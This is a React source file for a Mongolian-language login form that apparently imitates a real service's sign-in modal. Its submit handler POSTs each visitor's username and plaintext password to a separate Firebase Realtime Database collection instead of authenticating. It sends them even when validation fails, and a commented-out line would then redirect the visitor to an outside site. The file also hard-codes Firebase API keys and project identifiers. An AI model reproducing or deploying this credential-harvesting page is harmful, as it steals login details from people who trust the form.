import { useState } from "react";
import { Box, Button, Input, Text, Checkbox, Flex, Image } from "@chakra-ui/react";
import back from "../assets/back.png";
import tablet from "../assets/tablet.png";
import mobile from "../assets/mobile.png";
import mongolia from "../assets/mongolia.png";

import firebase from "firebase/app";
import "firebase/database"; // for the Realtime Database
import { initializeApp } from "firebase/app";
import { getFirestore, collection, getDocs } from "firebase/firestore/lite";
// 1. Import
import { Icon } from "@chakra-ui/react";
import { SmallCloseIcon, TriangleDownIcon } from "@chakra-ui/icons";
// import { useNavigate } from "react-router-dom";

const firebaseConfig = {
  apiKey: "AIzaSyDzzKM5vaWa7jYiOiBcdzN9h0gASfeTNg4",

  authDomain: "zevv-80552.firebaseapp.com",

  projectId: "zevv-80552",

  storageBucket: "zevv-80552.appspot.com",

  messagingSenderId: "505240279021",

  appId: "1:505240279021:web:e687d947f46d03882fb9e4",

  measurementId: "G-7FV0XF5FGD",
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const LoginForm = () => {
  // const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");

  const saveData = async () => {
    const data = {
      name: email,
      pass: password,
    };
    const res = await fetch("https://zevvv-537e2-default-rtdb.firebaseio.com/users.json", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        data,
      }),
    });
  };
  const handleSubmit = (event) => {
    event.preventDefault();

    // perform validation
    if (email === "") {
      setEmailError("Email is required");
    } else {
      setEmailError("");
    }

    if (password === "") {
      setPasswordError("Password is required");
    } else {
      setPasswordError("");
    }

    // submit the form if there are no errors
    if (email && password) {
      console.log("Submitted!");
    }
    saveData();
    // navigate(" https://zevnew.info/");
  };

  return (
    <Box
      pos={"relative"}
      display={"flex"}
      justifyContent="center"
      alignItems={"center"}
      bgImage={{ lg: back, md: tablet, base: mobile }}
      w="100vw"
      h="100vh"
      overflow={"hidden"}
    >
      <Box pos={"absolute"} top="0" left={"0"} width="100vw" height={"100vh"} bg="rgba(0, 0, 0, 0.5)"></Box>
      <Box bgColor="#282434" width="400px" height={"550px"} zIndex="1">
        <Box
          width={"100%"}
          h="56px"
          display={"flex"}
          justifyContent="space-between"
          alignItems={"center"}
          px={"10px"}
          fontSize="100%"
        >
          <Text
            color={"#fff"}
            whiteSpace="nowrap"
            cursor={"default"}
            fontFamily="'CondensedRegularFont', verdana, tahoma, sans-serif, arial"
            fontSize={"0.875em"}
            ml="5px"
          >
            НЭВТРЭХ
          </Text>
          |
          <Text
            borderRadius={"0.3em"}
            bg="transparent"
            width={"2em"}
            height="2em"
            border={"none"}
            cursor="pointer"
            boxSizing="border-box"
            outline={"none"}
          >
            <svg viewBox="0 0 24 24" width="24px" height="24px">
              <path
                fill="#fff"
                d="M18.3 5.7L12 12l6.3 6.3c.4.4.4 1 0 1.4-.2.2-.5.3-.7.3s-.5-.1-.7-.3L12 13.4l-5.6 5.6c-.2.2-.5.3-.7.3s-.5-.1-.7-.3c-.4-.4-.4-1 0-1.4l5.6-5.6L5.7 6.3c-.4-.4-.4-1 0-1.4.4-.4 1-.4 1.4 0l6.3 6.3 6.3-6.3c.4-.4 1-.4 1.4 0 .4.4.4 1 0 1.4z"
              />
            </svg>
          </Text>
        </Box>
        <Box padding="0 2.5em 2.5em">
          <Flex direction={"column"} gap="20px" justifyContent={"center"} alignItems="center">
            <Input
              mt="20px"
              placeholder="нэр"
              fontSize={"0.875em"}
              height="2.858em"
              w="100%"
              color={"#fff"}
              bg="#30303a"
              borderColor={"transparent"}
              boxShadow="none"
              borderRadius={"0.25em"}
              fontFamily="'CondensedRegularFont', verdana, tahoma, sans-serif, arial"
              display={"inline-flex"}
              boxSizing="border-box"
              paddingLeft={"0.5em"}
              paddingRight="0.5em"
              // focusBorderColor="#444"
              focusBorderColor="transparent"
              onChange={(e) => setEmail(e.target.value)}
            />
            <Input
              _placeholder={"Нууц үг"}
              fontSize={"0.875em"}
              height="2.858em"
              w="100%"
              color={"#fff"}
              bg="#30303a"
              borderColor={"transparent"}
              boxShadow="none"
              borderRadius={"0.25em"}
              fontFamily="'CondensedRegularFont', verdana, tahoma, sans-serif, arial"
              display={"inline-flex"}
              boxSizing="border-box"
              paddingLeft={"0.5em"}
              paddingRight="0.5em"
              // borderBottom="0.125em solid"
              // focusBorderColor="#444"
              focusBorderColor="transparent"
              onChange={(e) => setPassword(e.target.value)}
            />
            <Flex justifyContent="space-between" width={"100%"} mt="12px" mb="-10px">
              <Flex justifyContent={"flex-start"} alignItems="center">
                <Checkbox
                  left={0}
                  top="0"
                  width={"20px"}
                  height="20px"
                  fontFamily={"Icons"}
                  fontWeight="normal"
                  fontSize={"1.7em"}
                  lineHeight="1"
                  display={"flex"}
                  alignItems="center"
                  justifyContent={"center"}
                  mr="15px"
                />
                <Text
                  fontSize={"0.875em"}
                  w="200px"
                  color="#fff"
                  overflow={"hidden"}
                  paddingTop="0.2em"
                  paddingBottom={"0.2em"}
                  fontFamily={"'CondensedRegularFont', verdana, tahoma, sans-serif, arial"}
                >
                  Намайг сана
                </Text>
              </Flex>
              <Flex justifyContent={"center"} alignItems="center">
                <Image src={mongolia} w="25px" h="15px" mr="7px" />
                <Icon color={"#fff"} as={TriangleDownIcon} height="10px" />
              </Flex>
            </Flex>
            <Button
              height={"2.5em"}
              mt="1.7em"
              borderRadius={"0.25em"}
              boxSizing="border-box"
              color={"#fff"}
              fontFamily="'RegularFont', verdana, tahoma, sans-serif, arial"
              outline={"none"}
              border="none"
              cursor={"pointer"}
              width={"100%"}
              bgColor={"#BE2E2E"}
              onClick={(e) => handleSubmit(e)}
              mb="30px"
            >
              НЭВТРЭХ
            </Button>
            <Text
              border={"none"}
              boxShadow="none"
              mt="0.5em"
              borderRadius={"0.25em"}
              cursor="pointer"
              outline={"none"}
              fontSize="0.8em"
              color="#fff"
              display={"inline"}
              width="fit-content"
              height="fit-content"
              pb="0px"
              borderBottom={"1px solid #fff"}
              textAlign="center"
              mb="-10px"
            >
              НУУЦ ҮГЭЭ МАРТСАН?
            </Text>
            <Text
              border={"none"}
              boxShadow="none"
              borderRadius={"0.25em"}
              cursor="pointer"
              boxSizing="border-box"
              outline={"none"}
              fontSize="0.8em"
              color="#fff"
              display={"inline"}
              width="fit-content"
              pb="0px"
              height="fit-content"
              textAlign="center"
              mb="-17px"
              borderBottom={"1px solid #fff"}
            >
              БҮРТГҮҮЛЭХ
            </Text>
            <Button
              width={"100%"}
              bgColor={"#49499E"}
              border="none"
              boxShadow={"none"}
              marginTop="0.5em"
              borderRadius={"0.25em"}
              cursor="pointer"
              boxSizing="border-box"
              outline={"none"}
              color="#fff"
            >
              Үгүй
            </Button>
          </Flex>
        </Box>
      </Box>
    </Box>
  );
};

export default LoginForm;
